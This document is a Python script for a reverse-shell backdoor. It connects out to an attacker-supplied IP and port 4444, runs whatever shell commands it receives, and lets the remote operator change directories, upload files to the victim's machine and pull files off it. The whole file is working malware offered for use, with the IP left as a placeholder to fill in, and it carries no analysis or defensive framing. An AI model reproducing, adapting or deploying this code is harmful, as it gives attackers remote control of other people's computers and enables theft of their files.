#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def json_send(self, data):
        if isinstance(data, str):
            data_dumped = json.dumps(data)
        elif isinstance(data, bytes):
            data_dumped = json.dumps(data.decode())
        self.connection.send(data_dumped.encode())

    def json_recv(self):
        data_recv = ""
        while True:
            try:
                data_recv += (self.connection.recv(1024)).decode()
                return json.loads(data_recv)
            except ValueError:
                continue

    def change_dir(self, dir):
        os.chdir(dir)
        return("[+] Directory Changed Successfully!").encode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] Upload Successful!"

    def read_file(self, path):
            with open(path, "rb") as file:
                return base64.b64encode(file.read())

    def run_command(self, command):
        try:
            if command[0] == "bye":
                self.close()
            elif command[0] == "cd" and len(command)>1:
                if len(command) > 2:
                    string = " ".join(command[1:])
                    return self.change_dir(string)
                else:
                    return self.change_dir(command[1])
            elif command[0] == "download":
                if len(command) > 2:
                    string = " ".join(command[1:])
                    return self.read_file(string)
                else:
                    return self.read_file(command[1])
            elif command[0] == "upload":
                return self.write_file(command[1], command[2])
            else:
                return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            return("[-] Error! Invalid Command!").encode()
        except FileNotFoundError:
            return("[-] Invalid Path, File Not Found!").encode()
        except Exception:
             return("[-] Error Occured!").encode()

    def run(self):
        while True:
            received = self.json_recv()
            result = self.run_command(received)
            self.json_send(result)

    def close(self):
        self.connection.close()


def main():
    try:
        backdoor = Backdoor("Your-ip", 4444)   #ip and port
        backdoor.run()
    except KeyboardInterrupt:
        backdoor.close()
    except ConnectionResetError:
        backdoor.close()
    except ConnectionRefusedError: 
    	pass
    except UnboundLocalError:
    	pass
    except Exception:
        backdoor.close()



if __name__ == "__main__":
    main()
